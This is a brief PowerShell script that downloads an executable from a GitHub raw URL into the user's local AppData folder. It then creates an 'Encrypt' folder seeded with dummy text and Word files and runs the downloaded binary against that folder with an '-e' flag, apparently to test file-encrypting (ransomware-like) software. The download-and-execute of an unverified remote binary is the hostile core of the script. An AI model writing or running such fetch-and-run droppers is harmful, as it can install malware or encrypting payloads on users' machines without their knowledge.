$localpath = "${env:LOCALAPPDATA}"
$localpath = $localpath -replace ' ', '` '
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://github.com/ashakiro/test1/raw/main/main.exe","$localpath\main1.exe")
$localpathenc = $localpath + "\Encrypt"
if (Test-Path $localpathenc) {
   
    Write-Host "Folder Exists"
    # Perform Delete file from folder operation
}
else
{
  
    #PowerShell Create directory if not exists
    New-Item $localpathenc -ItemType Directory
    Write-Host "Folder Created successfully"
}
New-Item -Path "$localpath\Encrypt\PStxt.txt"
New-Item -Path "$localpath\Encrypt\PSdoc.doc"
$localpathexe = $localpath + "\main1.exe"

powershell $localpathexe -p $localpathenc -e
